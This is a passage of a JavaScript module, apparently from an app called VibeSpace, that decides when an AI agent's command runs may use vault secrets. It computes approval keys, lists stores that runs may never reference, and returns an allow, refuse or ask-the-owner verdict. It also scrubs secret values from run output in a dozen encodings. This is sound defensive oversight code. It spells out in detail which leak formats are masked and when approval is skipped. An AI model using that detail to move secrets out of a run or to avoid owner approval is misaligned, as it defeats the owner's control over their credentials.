  const noAlways = kind !== 'tool' ? kind : !known ? 'unknown-destination' : dest.opaque ? 'opaque-route' : !hosts.size ? 'unknown-destination' : row.runsProject ? 'runs-project-code' : configFile ? 'config-file' : run.programWritable ? 'program-writable' : null;
  return {
    v: SHAPE_V, tool: run.tool, name: run.name, kind, sub, flags: [...flags].sort(), args, hosts: [...hosts].sort(),
    routeHosts: dest.hosts.slice().sort(), routeOpaque: dest.opaque,
    entries: run.refs.map((r) => r.ref).sort(), injection: [...run.injection].sort(), env: run.plainEnv.map((e) => `${e.name}=${e.value}`).sort(), keyed: keyed.sort(),
    templates: run.files.filter((f) => f.text != null).map((f) => `${f.name}=${f.text}`).sort(), on: run.on || null, script,
    known, proxyEnv: !!(known && row.proxyEnv), always: !noAlways, noAlways, argvExposed: !!run.argvExposed,
  };
}
/** THE KEY a remembered «always» is stored under — everything decision ④ says, nothing positional. */
const shapeKeyOf = (s) => `${SHAPE_V}:${JSON.stringify([s.tool, s.sub, s.flags, s.args, s.hosts, s.entries, s.injection, s.env, s.templates, s.on, s.script, s.keyed])}`;

// ── WHICH ENTRIES A RUN MAY NEVER REFERENCE (each has its own door; the owner opens the rest one by one) ──
const OWN_DOORS = Object.freeze([
  Object.freeze({ store: 'accounts', door: 'the account pool — a conversation on that account already runs with it' }),
  Object.freeze({ store: 'integrations', door: 'the channel\'s raw API — vibespace-channels api' }),
  Object.freeze({ store: 'channels', door: 'the channel\'s own doors — vibespace-channels (send, api)' }),
  Object.freeze({ store: 'passkeys', door: 'the agent browser\'s passkey ceremony' }),
  Object.freeze({ store: 'automation', door: 'the Vault window, to hand to an outside party — VibeSpace\'s own key never goes into a run' }),
  Object.freeze({ store: 'secrets', entry: /^host:/, door: 'the machine\'s link (Remote) — a link token runs commands on that machine' }),
  Object.freeze({ store: 'secrets', entry: /^frp:/, door: 'the relay (the frp plugin) uses it itself' }),
  Object.freeze({ store: 'secrets', door: 'VibeSpace uses it itself' }),
]);
const RUNNABLE_STORES = Object.freeze(['mounts', 'app-secrets']);
/** A reference → the door it has instead (words), or null when the owner may open it for runs. A store this table does not
 *  know has no run door (fails closed). */
function ownDoorOf(ref) {
  if (!ref) return 'no run door';
  if (isAgentEntry(ref.store, ref.entry, ref.field)) return null;   // lane vault-run-door: an AGENT's own entry (mint / put) — the owner opens it like any other; only its conversation references it
  if (isFreeEntry(ref.store, ref.entry, ref.field)) return null;    // lane vault-paste-request: a free entry — the owner opens it (switch / grant)
  const d = OWN_DOORS.find((x) => x.store === ref.store && (!x.entry || x.entry.test(ref.entry)));
  return d ? d.door : RUNNABLE_STORES.includes(ref.store) ? null : 'no run door (a store the run table does not know)';
}

// ── THE VERDICT (§8.3) ──
/**
 * → { ok: true, by: 'always' | 'instance' } | { ok: false, code, words, … } | { ok: false, ask: true, code: 'ask', offers,
 *   alwaysTtls, alwaysDefault, reauth, ttlMs, noAlways, argvExposed }.
 * `state` the vault's; `plan` planOf's answer; `shape` shapeOf(plan); `entries` [{ id, exists, open, bytes }] (the door's
 * facts — `open` = the owner's «Usable by agent runs», `bytes` = the value's length); `granted` = this conversation may use
 * them (the who-may-use list, P1 vault-use-reach); `remembered` = { until } stored for (conversation, shapeKeyOf(shape));
 * `seen` = the owner allowed this (conversation, shape) once already, this unlock (the door's memory — lane vault-run-door);
 * `instance` 'cluster' | 'local'; `policy` 'ask' | 'allow' | null (null = the instance's: a cluster asks EVERY time, a local one
 * asks the first time and allows a SEEN shape — decision ②: «a new shape asks; a local instance allows after one 允许»).
 */
function runVerdict({ state, plan, shape = null, entries = [], granted = false, remembered = null, seen = false, instance = 'local', policy = null, now = Date.now() } = {}) {
  if (state === 'not_set_up') return refuse('vault_not_set_up');
  if (state !== 'unlocked') return refuse('vault_locked');
  if (!plan || !plan.ok) return plan && plan.code ? plan : refuse('bad_flag');
  const sh = shape || shapeOf(plan);
  const facts = new Map((Array.isArray(entries) ? entries : []).filter((e) => e && e.id).map((e) => [e.id, e]));
  for (const r of plan.refs) {
    const door = ownDoorOf(r);
    if (door) return refuse('entry_has_its_own_door', { ref: r.ref, door, words: `${WORDS.entry_has_its_own_door}: ${door}` });
    const e = facts.get(r.id);
    if (!e || !e.exists) return refuse('entry_unknown', { ref: r.ref });
    if (e.open !== true) return refuse('entry_not_runnable', { ref: r.ref });
    if (!(Number(e.bytes) >= MIN_MASK_BYTES)) return refuse('entry_too_short_to_mask', { ref: r.ref });
  }
  if (granted !== true) return refuse('use_not_granted');
  if (sh.always && remembered && (remembered.until == null || Number(remembered.until) > now)) return { ok: true, by: 'always' };
  const mode = policy === 'ask' || policy === 'allow' ? policy : instance === 'cluster' ? 'ask' : 'allow';
  if (mode === 'allow' && seen === true) return { ok: true, by: 'seen' };   // a NEW shape always draws the card (lane vault-run-door's mutant)
  return { ok: false, ask: true, code: 'ask', offers: sh.always ? ['once', 'always', 'deny'] : ['once', 'deny'], alwaysTtls: sh.always ? Object.keys(ALWAYS_TTLS) : [], alwaysDefault: sh.always ? ALWAYS_DEFAULT : null, reauth: sh.always, ttlMs: ASK_TTL_MS, noAlways: sh.noAlways, argvExposed: sh.argvExposed };
}

// ── THE SCRUBBER ──
function utf8(s) {
  const out = [];
  for (const ch of String(s)) {
    const c = ch.codePointAt(0);
    if (c < 0x80) out.push(c);
    else if (c < 0x800) out.push(0xc0 | (c >> 6), 0x80 | (c & 63));
    else if (c < 0x10000) out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
    else out.push(0xf0 | (c >> 18), 0x80 | ((c >> 12) & 63), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
  }
  return out;
}
const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
function b64(bytes) {
  let s = '';
  for (let i = 0; i < bytes.length; i += 3) {
    const n = (bytes[i] << 16) | ((bytes[i + 1] || 0) << 8) | (bytes[i + 2] || 0), k = bytes.length - i;
    s += B64[(n >> 18) & 63] + B64[(n >> 12) & 63] + (k > 1 ? B64[(n >> 6) & 63] : '=') + (k > 2 ? B64[n & 63] : '=');
  }
  return s;
}
const urlSafe = (s) => s.replace(/\+/g, '-').replace(/\//g, '_');
function base64Forms(bytes) {
  const full = b64(bytes), out = [];
  for (const f of [full, full.replace(/=+$/, '')]) out.push(['base64', f], ['base64', urlSafe(f)]);
  for (let k = 0; k < 3; k++) {   // inside a longer base64 run the value starts at byte k of a group: its OWN characters only
    const run = b64([...new Array(k).fill(0), ...bytes, 0, 0]);
    const core = run.slice(Math.ceil((8 * k) / 6), Math.floor((8 * (k + bytes.length)) / 6));
    out.push(['base64', core], ['base64', urlSafe(core)]);
  }
  return out;
}
const hex2 = (b, up) => { const h = (b < 16 ? '0' : '') + b.toString(16); return up ? h.toUpperCase() : h; };
function percentForms(bytes) {
  const ch = (b) => (b < 128 ? String.fromCharCode(b) : '');
  const unreserved = (b) => b < 128 && /[A-Za-z0-9\-_.~]/.test(ch(b));
  const keeps = [(b) => unreserved(b) || (b < 128 && "!'()*".includes(ch(b))), unreserved, (b) => unreserved(b) || b === 47, (b) => b < 128 && /[A-Za-z0-9*\-_.]/.test(ch(b)), () => false];   // encodeURIComponent · RFC 3986 · a path (Python quote) · a WHATWG form · every byte
  const out = [];
  for (const up of [true, false]) for (const keep of keeps) {
    const s = bytes.map((b) => (keep(b) ? ch(b) : '%' + hex2(b, up))).join('');
    out.push(['percent', s], ['percent', s.replace(/%20/g, '+')]);
  }
  return out;
}
const JSON_SHORT = Object.freeze({ 8: '\\b', 9: '\\t', 10: '\\n', 12: '\\f', 13: '\\r' });
function jsonForms(value) {
  const out = [];
  for (const slash of [false, true]) for (const uni of [null, 'lower', 'upper']) for (const html of [false, true]) {
    const u = (n) => { const h = n.toString(16).padStart(4, '0'); return '\\u' + (uni === 'upper' ? h.toUpperCase() : h); };
    let s = '';
    for (const c of String(value)) {
      const p = c.codePointAt(0);
      if (c === '"') s += '\\"';
      else if (c === '\\') s += '\\\\';
      else if (c === '/' && slash) s += '\\/';
      else if (p < 0x20) s += JSON_SHORT[p] || u(p);
      else if (html && (c === '<' || c === '>' || c === '&')) s += u(p);
      else if (uni && p >= 0x7f) s += p > 0xffff ? u(0xd800 + ((p - 0x10000) >> 10)) + u(0xdc00 + ((p - 0x10000) & 0x3ff)) : u(p);
      else s += c;
    }
    out.push(['json', s]);
  }
  return out;
}
const hexForms = (bytes) => { const lo = bytes.map((b) => hex2(b, false)).join(''); return [['hex', lo], ['hex', lo.toUpperCase()]]; };
/** UTF-8 bytes → text the way a stream decoder reads them (the door's StringDecoder; WHATWG: each maximal ill-formed run
 *  is one U+FFFD) — how a child's UTF-16 output reaches the scrubber. */
function decodeUtf8(bytes) {
  let s = '', i = 0;
  while (i < bytes.length) {
    const b = bytes[i];
    if (b < 0x80) { s += String.fromCharCode(b); i++; continue; }
    const need = b >= 0xc2 && b <= 0xdf ? 1 : b >= 0xe0 && b <= 0xef ? 2 : b >= 0xf0 && b <= 0xf4 ? 3 : 0;
    if (!need) { s += '�'; i++; continue; }
    let cp = b & (need === 1 ? 0x1f : need === 2 ? 0x0f : 0x07), lo = b === 0xe0 ? 0xa0 : b === 0xf0 ? 0x90 : 0x80, hi = b === 0xed ? 0x9f : b === 0xf4 ? 0x8f : 0xbf, j = i + 1;
    for (; j <= i + need; j++) { const c = bytes[j]; if (c === undefined || c < lo || c > hi) break; cp = (cp << 6) | (c & 0x3f); lo = 0x80; hi = 0xbf; }
    if (j <= i + need) { s += '�'; i = j; continue; }
    s += String.fromCodePoint(cp); i = j;
  }
  return s;
}
/** UTF-16 little- and big-endian, as the door's UTF-8 decoder reads those bytes (an ASCII value: its characters with a NUL after / before each). */
function utf16Forms(v) {
  const le = [], be = [];
  for (let i = 0; i < v.length; i++) { const u = v.charCodeAt(i); le.push(u & 255, u >> 8); be.push(u >> 8, u & 255); }
  return [['utf16', decodeUtf8(le)], ['utf16', decodeUtf8(be)]];
}
const B32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
/** base32 (RFC 4648 §6), padded and not, upper- and lower-case. */
function base32Forms(bytes) {
  let s = '', acc = 0, bits = 0;
  for (const b of bytes) { acc = ((acc << 8) | b) & 0xffff; bits += 8; while (bits >= 5) { s += B32[(acc >> (bits - 5)) & 31]; bits -= 5; } }
  if (bits) s += B32[(acc << (5 - bits)) & 31];
  const padded = s + '='.repeat((8 - (s.length % 8)) % 8);
  return [padded, s, padded.toLowerCase(), s.toLowerCase()].map((t) => ['base32', t]);
}
/**
 * THE FORMS — THE ONE LIST of what the scrubber knows (lane vault-scrub-forms, the desk's q-043 verify M1). A form is here
 * because a REAL tool prints it by itself; `producer` names one. `spelled` forms are texts formsOf builds from the value;
 * `read` forms are VIEWS (below): the output read with one family of escapes undone, every spelled form looked for in what
 * the view reads, the ORIGINAL span masked, its escapes included. What is NOT here, and why, is the header's ③.
 */
const FORM_ROWS = Object.freeze([
  ['raw', 'spelled', 'anything that prints what it was given: curl -v (> Authorization: Bearer …), an error echoing its input, an env dump'],
  ['base64', 'spelled', 'an HTTP Basic header (curl -v), a Kubernetes Secret (kubectl get secret -o yaml), a token inside a JSON body'],
  ['percent', 'spelled', 'a URL: its query, its userinfo (curl -v, git remote -v), a form body'],
  ['json', 'spelled', 'any JSON output: kubectl -o json, gh api, a JSON log line'],
  ['hex', 'spelled', 'a byte dump in a debug log; oathtool -v (Hex secret:)'],
  ['utf16', 'spelled', 'PowerShell 5\'s > and Out-File, reg export (UTF-16LE); Java\'s writeChars (UTF-16BE)'],
  ['base32', 'spelled', 'oathtool -v (Base32 secret:), an otpauth:// URI\'s secret='],
  ['qp', 'read', 'a mail body in quoted-printable (a fetched .eml, an IMAP FETCH): =XX for a byte, a soft line break =\\r\\n anywhere in the value'],
  ['escape', 'read', 'a language\'s repr of a value with a non-ASCII byte: Python b\'…\\xc3\\xbc…\' and \'…\\u00fc…\', Node util.inspect, Rust {:?} (\\u{…}), git and bash $\'…\' (octal)'],
  ['entity', 'read', 'an HTML page or an XML file showing the value: a template\'s escaping (&amp; &quot; &#x27; &#61;), a .NET or Maven config'],
  ['ansi', 'read', 'a terminal with colours: grep --color, git diff --color-words, a test runner\'s coloured diff — SGR escapes between the characters'],
  ['wrap', 'read', 'a wrapped line: a base64 mail body or openssl base64 output at 64 / 76 columns'],
].map(([form, how, producer]) => Object.freeze({ form, how, producer })));
const FORMS = Object.freeze(FORM_ROWS.map((r) => r.form));
/** A value → its SPELLED forms [{ form, text }] (distinct texts, the raw first). */
function formsOf(value) {
  const v = String(value == null ? '' : value), bytes = utf8(v);
  const all = [['raw', v],
    ...base64Forms(bytes),
    ...percentForms(bytes), ...jsonForms(v), ...hexForms(bytes), ...utf16Forms(v), ...base32Forms(bytes)];
  const seen = new Set(), out = [];
  for (const [form, text] of all) if (text && !seen.has(text)) { seen.add(text); out.push(Object.freeze({ form, text })); }
  return out;
}
const reEscape = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const NAMED_ENTITY = Object.freeze({ amp: '&', lt: '<', gt: '>', quot: '"', apos: '\'' });
const SIMPLE_ESCAPE = Object.freeze({ '\\': '\\', '\'': '\'', '"': '"', n: '\n', t: '\t', r: '\r' });
const textOf = (cp) => (cp >= 0 && cp <= 0x10ffff ? { text: String.fromCodePoint(cp) } : null);
/**
 * THE VIEWS — the `read` forms. A view's TOKEN is a short run that starts with one of its `triggers` (never found inside a
 * token) and stands for zero or more characters: `read(token)` → { byte } (joined with its neighbours as UTF-8, a byte that
 * is not UTF-8 read as Latin-1) | { text } ('' = dropped: a soft break, a colour) | null (not a token after all: read as it
 * is). `max` = the longest token, so a stream holds back an unfinished one; `pairs` = the trigger also escapes itself (`\\`),
 * so a run of triggers is read in pairs from its start and a stream holds back from the run's last pair boundary.
 */
const VIEWS = Object.freeze([
  { form: 'qp', triggers: '=', max: 3, re: /=(?:\r?\n|[0-9A-Fa-f]{2})/g, read: (t) => (t[1] === '\r' || t[1] === '\n' ? { text: '' } : { byte: parseInt(t.slice(1), 16) }) },
  { form: 'escape', triggers: '\\', max: 10, pairs: true, re: /\\(?:x[0-9A-Fa-f]{2}|[0-3][0-7]{2}|u\{[0-9A-Fa-f]{1,6}\}|u[0-9A-Fa-f]{4}|U[0-9A-Fa-f]{8}|[\\'"ntr])/g,
    read: (t) => (t[1] === 'x' ? { byte: parseInt(t.slice(2), 16) } : t[1] >= '0' && t[1] <= '3' ? { byte: parseInt(t.slice(1), 8) }
      : t[1] === 'u' && t[2] === '{' ? textOf(parseInt(t.slice(3, -1), 16)) : t[1] === 'u' ? { text: String.fromCharCode(parseInt(t.slice(2), 16)) }
        : t[1] === 'U' ? textOf(parseInt(t.slice(2), 16)) : { text: SIMPLE_ESCAPE[t[1]] }) },
  { form: 'entity', triggers: '&', max: 10, re: /&(?:#[0-9]{1,7};|#[xX][0-9A-Fa-f]{1,6};|amp;|lt;|gt;|quot;|apos;)/g,
    read: (t) => (t[1] !== '#' ? { text: NAMED_ENTITY[t.slice(1, -1)] } : textOf(t[2] === 'x' || t[2] === 'X' ? parseInt(t.slice(3, -1), 16) : parseInt(t.slice(2, -1), 10))) },
  { form: 'ansi', triggers: '\x1b', max: 35, re: /\x1b(?:\[[0-9;:?]{0,32}[mK]|[()][0-9A-Za-z])/g, read: () => ({ text: '' }) },
  { form: 'wrap', triggers: '\r\n', max: 1, re: /[\r\n]/g, read: () => ({ text: '' }) },
].map((v) => Object.freeze(v)));
const UTF8_NEED = (b) => (b >= 0xc2 && b <= 0xdf ? 1 : b >= 0xe0 && b <= 0xef ? 2 : b >= 0xf0 && b <= 0xf4 ? 3 : 0);
/**
 * What view `vw` reads in buf[0, end) → null when no token is there (it reads what the plain text says), else { sk, at, to,
 * spans, end }: sk[i] stands for buf[at[i], to[i]); `spans` = [start, end) of every run a token-made character covers (a
 * stream never cuts inside one); `end` moves back over a trailing UTF-8 character still missing a byte (not `final`).
 */
function readView(vw, buf, end, final) {
  let sk = '', i = 0, any = false, m;
  const at = [], to = [], spans = [], bytes = [];
  const lit = (a, b) => { for (let k = a; k < b; k++) { sk += buf[k]; at.push(k); to.push(k + 1); } };
  const put = (text, a, b) => { for (let k = 0; k < text.length; k++) { sk += text[k]; at.push(a); to.push(b); } if (b - a > 1) spans.push(a, b); };
  const flush = () => {
    for (let k = 0; k < bytes.length;) {
      const [b, s] = bytes[k], need = UTF8_NEED(b);
      let cp = b & (need === 1 ? 0x1f : need === 2 ? 0x0f : 0x07), j = k + 1;
      for (; need && j <= k + need && j < bytes.length; j++) { const c = bytes[j][0]; if (c < 0x80 || c > 0xbf) break; cp = (cp << 6) | (c & 0x3f); }
      const whole = need && j === k + need + 1 && cp >= [0, 0x80, 0x800, 0x10000][need] && cp <= 0x10ffff && !(cp >= 0xd800 && cp <= 0xdfff);
      if (whole) { put(String.fromCodePoint(cp), s, bytes[j - 1][2]); k = j; } else { put(String.fromCharCode(b), s, bytes[k][2]); k++; }
    }
    bytes.length = 0;
  };
  vw.re.lastIndex = 0;
  while ((m = vw.re.exec(buf)) !== null) {
    const s = m.index, e = s + m[0].length;
    if (e > end) break;
    const r = vw.read(m[0]);
    if (!r) continue;
    any = true;
    if (s > i) { flush(); lit(i, s); }
    if (r.byte != null) bytes.push([r.byte, s, e]);
    else if (r.text) { flush(); put(r.text, s, e); }
    else if (e - s > 1) spans.push(s, e);   // dropped (a soft break, a colour) — bytes on either side still join: =C3=\r\n=BC is one ü
    i = e;
  }
  if (!any) return null;
  if (!final && i === end && bytes.length) {   // a character still missing a byte at the end waits for the next chunk
    let k = bytes.length - 1;
    while (k > 0 && bytes[k][0] >= 0x80 && bytes[k][0] <= 0xbf) k--;
    if (UTF8_NEED(bytes[k][0]) > bytes.length - 1 - k) { end = bytes[k][1]; bytes.length = k; i = end; }
  }
  flush(); lit(i, end);
  return { sk, at, to, spans, end };
}
/**
 * A RUN's scrubber — ONE per run, fed by every stream of it (the desk's «one window per run»). `secrets` = [{ ref | label,
 * value }] — `ref` a parsed reference (its placeholder) or `label` the `<store>/<row>/<field>`. → { push(stream, chunk) →
 * { <stream>: text }, end() → { <stream>: text }, hits, bytes (UTF-8 bytes of the spans it replaced — the audit's count),
 * byForm, window }.
 * WHAT IT READS: each stream's own text, and — while more than one stream has text kept back — the run's text in ARRIVAL
 * order, so a value split between stdout and stderr is seen whole AND a value inside one stream is never lost to the other's
 * chunks between its characters. A find masks its span on every stream it covers (each gets the placeholder).
 * WHAT IT KEEPS BACK: per stream, the last `window` (longest spelled form − 1) characters as every view reads them, a token
 * not finished yet, and the run's last `window` characters in arrival order; a find is handed on whole or kept back whole
 * (on every stream it covers) — an occurrence that starts before the kept text is whole in the buffer, one that starts
 * inside it waits for the next chunk (or `end`). One stream: chunked or whole, the output is the same (test-vault-run-model).
 * Hand it text from a streaming decoder (StringDecoder / TextDecoder { stream: true }) — never bytes cut mid-character.
 * A value under MIN_MASK_BYTES throws `entry_too_short_to_mask` (runVerdict refused it already).
 */
function createRunMasker(secrets, streams = ['out', 'err']) {
  const table = new Map();
  for (const s of Array.isArray(secrets) ? secrets : []) {
    const v = String(s && s.value != null ? s.value : '');
    if (bytesOf(v) < MIN_MASK_BYTES) { const e = new Error(WORDS.entry_too_short_to_mask); e.code = 'entry_too_short_to_mask'; throw e; }
    const ph = placeholderOf(s.ref && typeof s.ref === 'object' ? s.ref : s.label != null ? { label: s.label } : parseRef(String(s.ref)) || String(s.ref));
    for (const f of formsOf(v)) if (!table.has(f.text)) table.set(f.text, { ph, form: f.form });
  }
  const texts = [...table.keys()].sort((a, b) => b.length - a.length);
  const re = texts.length ? new RegExp(texts.map(reEscape).join('|'), 'g') : null;
  const maxLen = texts.length ? texts[0].length : 1;
  const W = maxLen - 1;
  const names = [...streams];
  let held = [];   // [[stream, text]] in arrival order — what the run has not handed on yet
  const st = { hits: 0, bytes: 0, byForm: {} };
  /** ONE text read plainly and through every view → { safe (what is decided), finds [{ s, e, ph, form }], spans [[s, e]] }. */
  function scan(buf, final) {
    const L = buf.length;
    let safe = final ? L : L - W;
    const views = [];
    for (const vw of VIEWS) {
      let end = L;
      if (!final) for (let k = Math.max(0, L - vw.max + 1); k < L; k++) if (vw.triggers.includes(buf[k])) {
        if (vw.pairs) { let j = k; while (j > 0 && buf[j - 1] === buf[k]) j--; k = j + 2 * Math.floor((k - j) / 2); }   // the last pair boundary of the run (a run is read in pairs from its start)
        end = k; break;
      }
      const r = readView(vw, buf, end, final);
      if (!final) { const len = r ? r.sk.length : end, ss = len - W; safe = Math.min(safe, ss <= 0 ? 0 : !r ? ss : ss < len ? r.at[ss] : r.end); }
      if (r) views.push([vw, r]);
    }
    safe = Math.max(0, safe);
    const finds = [], spans = [];
    const look = (sk, r, form) => {
      re.lastIndex = 0;
      let m;
      while ((m = re.exec(sk)) !== null) {
        const s = r ? r.at[m.index] : m.index;
        if (s >= safe) break;
        const t = table.get(m[0]);
        finds.push({ s, e: r ? r.to[m.index + m[0].length - 1] : m.index + m[0].length, ph: t.ph, form: form || t.form });
      }
    };
    look(buf, null, null);
    for (const [vw, r] of views) { look(r.sk, r, vw.form); for (let k = 0; k < r.spans.length; k += 2) spans.push([r.spans[k], r.spans[k + 1]]); }
    return { safe, finds, spans };
  }
  function step(final) {
    const out = {}; for (const k of names) out[k] = '';
    if (!held.length) return out;
    const own = new Map();   // stream → its kept-back text
    for (const [k, x] of held) own.set(k, (own.get(k) || '') + x);
    if (!re) { for (const [k, x] of own) out[k] += x; held = []; return out; }
    // GROUPS: a find (or one token / joined character a view read) → its range on each stream it covers, [a, b) in that
    // stream's own text — handed on whole, or kept back whole on every one of them
    const groups = [], cut = new Map();
    for (const [k, x] of own) {
      const sc = scan(x, final);
      cut.set(k, sc.safe);
      for (const f of sc.finds) groups.push({ r: [[k, f.s, f.e]], ph: f.ph, form: f.form });
      for (const [a, b] of sc.spans) groups.push({ r: [[k, a, b]], tok: true });
    }
    if (own.size > 1) {   // the run's text in arrival order: a value split between the pipes
      const all = held.map((x) => x[1]).join(''), streamAt = [], idxAt = [], seen = new Map();
      for (const [k, x] of held) for (let j = 0; j < x.length; j++) { const i = seen.get(k) || 0; streamAt.push(k); idxAt.push(i); seen.set(k, i + 1); }
      const rangesOf = (a, b) => { const m = new Map(); for (let i = a; i < b; i++) { const k = streamAt[i], x = m.get(k); if (x) x[2] = idxAt[i] + 1; else m.set(k, [k, idxAt[i], idxAt[i] + 1]); } return [...m.values()]; };
      const sc = scan(all, final);
      if (!final) { const n = new Map(); for (let i = 0; i < sc.safe; i++) n.set(streamAt[i], (n.get(streamAt[i]) || 0) + 1); for (const [k] of own) cut.set(k, Math.min(cut.get(k), n.get(k) || 0)); }
      for (const f of sc.finds) groups.push({ r: rangesOf(f.s, f.e), ph: f.ph, form: f.form });
      for (const [a, b] of sc.spans) groups.push({ r: rangesOf(a, b), tok: true });
    }
    if (!final) for (let moved = true; moved;) {   // never cut inside a group: one not wholly before the cuts is kept back whole
      moved = false;
      for (const g of groups) {
        if (g.r.every(([k, , b]) => b <= cut.get(k))) continue;
        for (const [k, a] of g.r) if (a < cut.get(k)) { cut.set(k, a); moved = true; }
      }
    }
    for (const [k, x] of own) {
      const c = cut.get(k);
      const masks = groups.filter((g) => !g.tok && g.r.every(([j, , b]) => b <= cut.get(j))).flatMap((g) => g.r.filter(([j]) => j === k).map(([, a, b]) => ({ a, b, ph: g.ph, form: g.form })));
      masks.sort((p, q) => p.a - q.a || q.b - p.b);
      let i = 0, last = null;
      for (const m of masks) {
        if (last && m.a < last.b) { if (m.b > last.b) { st.bytes += bytesOf(x.slice(last.b, m.b)); last.b = m.b; i = m.b; } continue; }   // overlapping finds: one placeholder
        out[k] += x.slice(i, m.a) + m.ph;
        st.hits++; st.bytes += bytesOf(x.slice(m.a, m.b)); st.byForm[m.form] = (st.byForm[m.form] || 0) + 1;
        last = { b: m.b }; i = m.b;
      }
      out[k] += x.slice(i, c);
    }
    const used = new Map(), next = [];
    for (const [k, x] of held) {
      const u = used.get(k) || 0, keep = x.slice(Math.max(0, cut.get(k) - u));
      used.set(k, u + x.length);
      if (keep) { const p = next[next.length - 1]; if (p && p[0] === k) p[1] += keep; else next.push([k, keep]); }
    }
    held = next;
    return out;
  }
  return {
    push(stream, chunk) {
      if (!names.includes(stream)) throw new TypeError(`no such stream: ${stream}`);
      const t = String(chunk == null ? '' : chunk);
      if (t) { const last = held[held.length - 1]; if (last && last[0] === stream) last[1] += t; else held.push([stream, t]); }
      return step(false);
    },
    end: () => step(true),
    get hits() { return st.hits; }, get bytes() { return st.bytes; }, get byForm() { return { ...st.byForm }; }, window: W, streams: names,
  };
}
/** ONE stream's scrubber (a whole text, the belt's): the run masker with one stream. → { push(chunk) → text, end() → text, hits, bytes, byForm, window }. */
function createMasker(secrets) {
  const m = createRunMasker(secrets, ['out']);
  return { push: (chunk) => m.push('out', chunk).out, end: () => m.end().out, get hits() { return m.hits; }, get bytes() { return m.bytes; }, get byForm() { return m.byForm; }, window: m.window };
}
/** One whole text scrubbed (a card's command, a short output, the output belt's sink text). */
function maskText(text, secrets) { const m = createMasker(secrets); return m.push(text) + m.end(); }

module.exports = {
  SCHEME, MIN_MASK_BYTES, CMD_MAX, TEMPLATE_MAX, TIMEOUT_DEFAULT_S, TIMEOUT_MAX_S, OUTPUT_MAX_BYTES, ASK_TTL_MS, ALWAYS_TTLS, ALWAYS_DEFAULT, SHAPE_V, SHAPE_NOTE, WORDS, refusalOf,
  parseRef, scanRefs, renderTemplate, placeholderOf, agentScopeOf, isFreeEntry, refFor: refOf,
  INJECTIONS, injectionOf, ENV_HIJACK, ENV_CONFIG, envRefusedOf,
  TOOL_ROWS, SHELLS, INTERPRETERS, KNOWN_TOOLS, toolNameOf, knownToolOf, refusedTool, toolKindOf,
  RUN_FLAGS, parseRunArgs, timeoutOf, planOf, materialize,
  shapeOf, shapeKeyOf, destinationsOf, routeTargetsOf, targetOf, urlParse, splitAuthority, OWN_DOORS, RUNNABLE_STORES, ownDoorOf, runVerdict,
  FORMS, FORM_ROWS, VIEWS, formsOf, createMasker, createRunMasker, maskText,
};
